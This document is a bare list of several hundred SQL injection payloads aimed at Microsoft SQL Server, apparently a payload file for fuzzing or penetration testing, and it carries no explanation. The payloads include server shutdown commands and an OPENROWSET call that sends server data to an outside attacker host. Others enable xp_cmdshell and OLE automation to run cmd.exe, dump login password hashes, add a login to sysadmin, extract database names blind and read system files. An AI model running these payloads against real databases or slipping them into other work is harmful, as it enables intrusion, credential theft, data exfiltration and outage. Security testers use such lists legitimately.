' shutdown --
' shutdown); --
' or ‘ shutdown --
' insert into openrowset(‘SQLOLEDB’, ‘DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein’, ‘select * from foo’) values (@@version) --
' 2=1 or insert into openrowset(‘SQLOLEDB’, ‘DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein’, ‘select * from foo’) values (@@version) --
' EXECUTE sp_configure ‘show advanced options’, 1; RECONFIGURE WITH OVERRIDE; EXECUTE sp_configure ‘xp_cmdshell’, ‘1’ RECONFIGURE WITH OVERRIDE; --
' 1=2 or select suser_sname() --
' union select suser_sname() --
' SELECT db_name() --
' union SELECT db_name() --
' SELECT @@servername --
a';SET QUOTED_IDENTIFIER OFF;select * FROM OPENROWSET("SQLOLEDB","";"sa";"password","SELECT 1");--
' UNION SELECT @@servername --
' UNION SELECT grantee, table_name, privilege_type FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES --
' SELECT grantee, table_name, privilege_type FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES --
' SELECT name FROM sysobjects --
' UNION SELECT name FROM sysobjects --
' SELECT user_name(); --
' SELECT system_user; --
' SELECT name FROM master..syslogins --
' SELECT user; --
' SELECT name, password_hash FROM master.sys.sql_logins —
' SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins —-
' SELECT name, password FROM master..sysxlogins --
' SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID --
' SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins —-
' SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’); —-
' SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’); —-
' SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’); –-
' SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’); --
' SELECT is_srvrolemember(‘sysadmin’); --
' SELECT is_srvrolemember(‘dbcreator’); --
' SELECT is_srvrolemember(‘bulkadmin’); --
' SELECT is_srvrolemember(‘diskadmin’); --
' SELECT is_srvrolemember(‘processadmin’); --
' SELECT is_srvrolemember(‘serveradmin’); --
' SELECT is_srvrolemember(‘setupadmin’); --
' SELECT is_srvrolemember(‘securityadmin’); --
' SELECT name FROM master..syslogins WHERE denylogin = 0; --
' SELECT name FROM master..syslogins WHERE hasaccess = 1; --
' SELECT name FROM master..syslogins WHERE isntname = 0; --
' SELECT name FROM master..syslogins WHERE isntgroup = 0; --
' SELECT name FROM master..syslogins WHERE sysadmin = 1; --
' SELECT name FROM master..syslogins WHERE securityadmin = 1; --
' SELECT name FROM master..syslogins WHERE serveradmin = 1; --
' SELECT name FROM master..syslogins WHERE setupadmin = 1; --
' SELECT name FROM master..syslogins WHERE processadmin = 1; --
' SELECT name FROM master..syslogins WHERE diskadmin = 1; --
' SELECT name FROM master..syslogins WHERE dbcreator = 1; --
' SELECT name FROM master..syslogins WHERE bulkadmin = 1; --
' SELECT is_srvrolemember(‘sysadmin’, ‘sa’); —-
' SELECT name FROM master..syslogins WHERE sysadmin = ’1′ —-
' SELECT DB_NAME() --
' UNION SELECT DB_NAME() --
' SELECT DB_NAME(); --
'); SELECT DB_NAME() --
' OR 6=9; DB_NAME(); --
' SELECT name FROM master..sysdatabases;--
' UNION SELECT name FROM master..sysdatabases; --
'); SELECT DB_NAME(1); —-
' UNION SELECT DB_NAME(1); —-
' SELECT DB_NAME(1); —-
' SELECT DB_NAME(2); —-
' SELECT DB_NAME(3); —-
' SELECT DB_NAME(4); —-
' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); —-
' SELECT name FROM master..sysobjects WHERE xtype = ‘U’; —-
' SELECT name FROM master..sysobjects WHERE xtype = ‘V’; —-
' CREATE TABLE mydata (line varchar(8000));
' BULK INSERT mydata FROM ‘c:boot.ini’; --
' DROP TABLE mydata; --
' SELECT HOST_NAME(); --
'1 AND (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6%')) --
'1 AND (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6d%')) --
'1 AND (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6d006%')) --
'1 AND (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6d0061%')) --
'1 and (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'm%')) --
'1 and (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'ma%')) --
'1 and (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'mas%')) --
'1 and (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'mast%')) --
'1 and (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'maste%')) --
'1 and (1 <= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'master%')) --
' EXEC master.dbo.sp_addsrvrolemember ‘user1’, ‘sysadmin; --
' EXEC sp_addlogin ‘user1’, ‘pass1’; —-
' EXEC sp_ActiveDirectory_Obj(); --
' EXEC sp_ActiveDirectory_SCP(); --
' EXEC sp_add_alert(); --
' EXEC sp_addalias(); --
' EXEC sp_addapprole(); --
' EXEC sp_add_data_file_recover_suspect_db(); --
' EXEC sp_addextendedproc(); --
' EXEC sp_addextendedproperty(); --
' EXEC sp_addgroup(); --
' EXEC sp_add_category(); --
' EXEC sp_add_job(); --
' EXEC sp_add_jobschedule(); --
' EXEC sp_add_jobserver(); --
' EXEC sp_add_jobstep(); --
' EXEC sp_addlinkedserver(); --
' EXEC sp_addlinkedsrvlogin(); --
' EXEC sp_add_log_file_recover_suspect_db(); --
' EXEC sp_addlogin(); --
' EXEC sp_add_log_shipping_database(); --
' EXEC sp_add_log_shipping_plan(); --
' EXEC sp_add_log_shipping_plan_database(); --
' EXEC sp_add_log_shipping_primary(); --
' EXEC sp_add_log_shipping_secondary(); --
' EXEC sp_add_maintenance_plan(); --
' EXEC sp_add_maintenance_plan_db(); --
' EXEC sp_add_maintenance_plan_job(); --
' EXEC sp_addmessage(); --
' EXEC sp_add_notification(); --
' EXEC sp_add_operator(); --
' EXEC sp_addremotelogin(); --
' EXEC sp_addrole(); --
' EXEC sp_addrolemember(); --
' EXEC sp_addserver(); --
' EXEC sp_addsrvrolemember(); --
' EXEC sp_addtask(); --
' EXEC sp_addtype(); --
' EXEC sp_add_targetservergroup(); --
' EXEC sp_addumpdevice(); --
' EXEC sp_add_targetsvrgrp_member(); --
' EXEC sp_adduser(); --
' EXEC sp_altermessage(); --
' EXEC sp_apply_job_to_targets(); --
' EXEC sp_approlepassword(); --
' EXEC sp_attach_db(); --
' EXEC sp_attach_single_file_db(); --
' EXEC sp_autostats(); --
' EXEC sp_bindefault(); --
' EXEC sp_bindrule(); --
' EXEC sp_bindsession(); --
' EXEC sp_can_tlog_be_applied(); --
' EXEC sp_catalogs(); --
' EXEC sp_certify_removable(); --
' EXEC sp_change_monitor_role(); --
' EXEC sp_change_primary_role(); --
' EXEC sp_change_secondary_role(); --
' EXEC sp_change_users_login(); --
' EXEC sp_changedbowner(); --
' EXEC sp_changegroup(); --
' EXEC sp_changeobjectowner(); --
' EXEC sp_column_privileges(); --
' EXEC sp_column_privileges_ex(); --
' EXEC sp_columns(); --
' EXEC sp_columns_ex(); --
' EXEC sp_configure(); --
' EXEC sp_create_log_shipping_monitor_account(); --
' EXEC sp_create_removable(); --
' EXEC sp_createstats(); --
' EXEC sp_cursor_list(); --
' EXEC sp_cycle_errorlog(); --
' EXEC sp_databases(); --
' EXEC sp_datatype_info(); --
' EXEC sp_dbcmptlevel(); --
' EXEC sp_dbfixedrolepermission(); --
' EXEC sp_dboption(); --
' EXEC sp_dbremove(); --
' EXEC sp_defaultdb(); --
' EXEC sp_defaultlanguage(); --
' EXEC sp_define_log_shipping_monitor(); --
' EXEC sp_delete_alert(); --
' EXEC sp_delete_backuphistory(); --
' EXEC sp_delete_category(); --
' EXEC sp_delete_database_backuphistory(); --
' EXEC sp_delete_job sp_delete_jobschedule(); --
' EXEC sp_delete_jobserver sp_delete_jobstep(); --
' EXEC sp_delete_log_shipping_database(); --
' EXEC sp_delete_log_shipping_monitor_info(); --
' EXEC sp_delete_log_shipping_plan(); --
' EXEC sp_delete_log_shipping_plan_database(); --
' EXEC sp_delete_log_shipping_primary(); --
' EXEC sp_delete_log_shipping_secondary(); --
' EXEC sp_delete_maintenance_plan(); --
' EXEC sp_delete_maintenance_plan_db(); --
' EXEC sp_delete_maintenance_plan_job(); --
' EXEC sp_delete_notification(); --
' EXEC sp_delete_operator(); --
' EXEC sp_delete_targetserver(); --
' EXEC sp_delete_targetservergroup(); --
' EXEC sp_delete_targetsvrgrp_member(); --
' EXEC sp_denylogin(); --
' EXEC sp_depends(); --
' EXEC sp_describe_cursor(); --
' EXEC sp_describe_cursor_columns(); --
' EXEC sp_describe_cursor_tables(); --
' EXEC sp_detach_db(); --
' EXEC sp_dropalias(); --
' EXEC sp_dropapprole(); --
' EXEC sp_dropdevice(); --
' EXEC sp_dropextendedproc(); --
' EXEC sp_dropextendedproperty(); --
' EXEC sp_dropgroup(); --
' EXEC sp_droplinkedsrvlogin(); --
' EXEC sp_droplogin(); --
' EXEC sp_dropmessage(); --
' EXEC sp_dropremotelogin(); --
' EXEC sp_droprole(); --
' EXEC sp_droprolemember(); --
' EXEC sp_dropserver(); --
' EXEC sp_dropsrvrolemember(); --
' EXEC sp_droptask(); --
' EXEC sp_droptype(); --
' EXEC sp_dropuser(); --
' EXEC sp_dropwebtask(); --
' EXEC sp_enumcodepages(); --
' EXEC sp_executesql(); --
' EXEC sp_fkeys(); --
' EXEC sp_foreignkeys(); --
' EXEC sp_fulltext_catalog(); --
' EXEC sp_fulltext_column(); --
' EXEC sp_fulltext_database(); --
' EXEC sp_fulltext_service(); --
' EXEC sp_fulltext_table(); --
' EXEC sp_getapplock(); --
' EXEC sp_getbindtoken(); --
' EXEC sp_get_log_shipping_monitor_info(); --
' EXEC sp_grantdbaccess(); --
' EXEC sp_grantlogin(); --
' EXEC sp_help(); --
' EXEC sp_help_alert(); --
' EXEC sp_help_category(); --
' EXEC sp_helpconstraint(); --
' EXEC sp_helpdb(); --
' EXEC sp_helpdbfixedrole(); --
' EXEC sp_helpdevice(); --
' EXEC sp_help_downloadlist(); --
' EXEC sp_helpextendedproc(); --
' EXEC sp_helpfile(); --
' EXEC sp_helpfilegroup(); --
' EXEC sp_help_fulltext_catalogs(); --
' EXEC sp_help_fulltext_catalogs_cursor(); --
' EXEC sp_help_fulltext_columns(); --
' EXEC sp_help_fulltext_columns_cursor(); --
' EXEC sp_help_fulltext_tables(); --
' EXEC sp_help_fulltext_tables_cursor(); --
' EXEC sp_helpgroup sp_helphistory(); --
' EXEC sp_help_job sp_help_jobhistory(); --
' EXEC sp_help_jobschedule(); --
' EXEC sp_help_jobserver(); --
' EXEC sp_help_jobstep(); --
' EXEC sp_helpindex(); --
' EXEC sp_helplanguage(); --
' EXEC sp_helplinkedsrvlogin(); --
' EXEC sp_helplogins(); --
' EXEC sp_help_maintenance_plan(); --
' EXEC sp_help_notification(); --
' EXEC sp_helpntgroup(); --
' EXEC sp_help_operator(); --
' EXEC sp_helpremotelogin(); --
' EXEC sp_helprole(); --
' EXEC sp_helprolemember(); --
' EXEC sp_helprotect(); --
' EXEC sp_helpserver(); --
' EXEC sp_helpsort(); --
' EXEC sp_helpsrvrole(); --
' EXEC sp_helpsrvrolemember(); --
' EXEC sp_helpstats(); --
' EXEC sp_help_targetserver(); --
' EXEC sp_help_targetservergroup(); --
' EXEC sp_helptask(); --
' EXEC sp_helptext(); --
' EXEC sp_helptrigger(); --
' EXEC sp_helpuser(); --
' EXEC sp_indexes(); --
' EXEC sp_indexoption(); --
' EXEC sp_invalidate_textptr(); --
' EXEC sp_linkedservers(); --
' EXEC sp_lock(); --
' EXEC sp_makewebtask(); --
' EXEC sp_manage_jobs_by_login(); --
' EXEC sp_monitor(); --
' EXEC sp_MShasdbaccess(); --
' EXEC sp_msx_defect(); --
' EXEC sp_msx_enlist(); --
' EXEC sp_OACreate(); --
' EXEC sp_OADestroy(); --
' EXEC sp_OAGetErrorInfo(); --
' EXEC sp_OAGetProperty(); --
' EXEC sp_OAMethod(); --
' EXEC sp_OASetProperty(); --
' EXEC sp_OAStop(); --
' EXEC sp_password(); --
' EXEC sp_pkeys(); --
' EXEC sp_primarykeys(); --
' EXEC sp_post_msx_operation(); --
' EXEC sp_processmail(); --
' EXEC sp_procoption(); --
' EXEC sp_purgehistory(); --
' EXEC sp_purge_jobhistory(); --
' EXEC sp_reassigntask(); --
' EXEC sp_recompile(); --
' EXEC sp_refreshview(); --
' EXEC sp_releaseapplock(); --
' EXEC sp_remoteoption(); --
' EXEC sp_remove_job_from_targets(); --
' EXEC sp_remove_log_shipping_monitor(); --
' EXEC sp_rename(); --
' EXEC sp_renamedb(); --
' EXEC sp_resetstatus(); --
' EXEC sp_resolve_logins(); --
' EXEC sp_resync_targetserver(); --
' EXEC sp_revokedbaccess(); --
' EXEC sp_revokelogin(); --
' EXEC sp_runwebtask(); --
' EXEC sp_server_info(); --
' EXEC sp_serveroption(); --
' EXEC sp_setapprole(); --
' EXEC sp_setnetname(); --
' EXEC sp_settriggerorder(); --
' EXEC sp_spaceused(); --
' EXEC sp_special_columns(); --
' EXEC sp_sproc_columns(); --
' EXEC sp_srvrolepermission(); --
' EXEC sp_start_job(); --
' EXEC sp_statistics(); --
' EXEC sp_stop_job(); --
' EXEC sp_stored_procedures(); --
' EXEC sp_tableoption(); --
' EXEC sp_table_privileges(); --
' EXEC sp_table_privileges_ex(); --
' EXEC sp_tables(); --
' EXEC sp_tables_ex(); --
' EXEC sp_trace_create(); --
' EXEC sp_trace_generateevent(); --
' EXEC sp_trace_setevent(); --
' EXEC sp_trace_setfilter(); --
' EXEC sp_trace_setstatus(); --
' EXEC sp_unbindefault(); --
' EXEC sp_unbindrule(); --
' EXEC sp_update_alert(); --
' EXEC sp_update_category(); --
' EXEC sp_updateextendedproperty(); --
' EXEC sp_update_job(); --
' EXEC sp_update_jobschedule(); --
' EXEC sp_update_jobstep(); --
' EXEC sp_update_log_shipping_monitor_info(); --
' EXEC sp_update_log_shipping_plan(); --
' EXEC sp_update_log_shipping_plan_database(); --
' EXEC sp_update_notification(); --
' EXEC sp_update_operator(); --
' EXEC sp_updatestats(); --
' EXEC sp_update_targetservergroup(); --
' EXEC sp_updatetask(); --
' EXEC sp_validname(); --
' EXEC sp_validatelogins(); --
' EXEC sp_who(); --
' EXEC sp_xml_preparedocument(); --
' EXEC sp_xml_removedocument(); --
' EXEC xp_cmdshell(); --
' EXEC xp_deletemail(); --
' EXEC xp_enumgroups(); --
' EXEC xp_findnextmsg(); --
' EXEC xp_grantlogin(); --
' EXEC xp_logevent(); --
' EXEC xp_loginconfig(); --
' EXEC xp_logininfo(); --
' EXEC xp_msver(); --
' EXEC xp_readmail(); --
' EXEC xp_revokelogin(); --
' EXEC xp_sendmail(); --
' EXEC xp_sprintf(); --
' EXEC xp_sqlagent_msx_account(); --
' EXEC xp_sqlagent_proxy_account(); --
' EXEC xp_sqlmaint(); --
' EXEC xp_sscanf(); --
' EXEC xp_startmail(); --
' EXEC xp_stopmail(); --
' EXEC xp_regaddmultistring(); --
' EXEC xp_regdeletekey(); --
' EXEC xp_regdeletevalue(); --
' EXEC xp_regenumkeys(); --
' EXEC xp_regenumvalues(); --
' EXEC xp_regread(); --
' EXEC xp_regremovemultistring(); --
' EXEC xp_regwrite(); --
' EXEC xp_servicecontrol(); --
' EXEC xp_availablemedia(); --
' EXEC xp_enumdsn(); --
' EXEC xp_makecab(); --
' EXEC xp_ntsec_enumdomains(); --
' EXEC xp_terminate_process(); --
' AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables) --
' AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))
' UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename') --
' AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns) --
' AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns)) --
' AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END; --
' AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB); --
' AND 1=0; DROP TABLE TMP_DB; --
' and 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--sp_password --
' SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"') --
' EXEC sp_configure 'show advanced options', 1 --
' EXEC sp_configure reconfigure --
' EXEC sp_configure 'xp_cmdshell', 1 --
' DECLARE @execmd INT; EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT; EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c' --
'EXEC sp_configure 'show advanced options', 1 --
' EXEC sp_configure 'OLE Automation Procedures', 1 --
' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'<br></font><font color="black">'%2Bdir,'<dir>','</font><font color="orange">') FROM %23Data WHERE dir>@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--
' UNION SELECT tbl FROM TMP_DB--
' DROP TABLE TMP_DB--
' AND 1=1--sp_password --
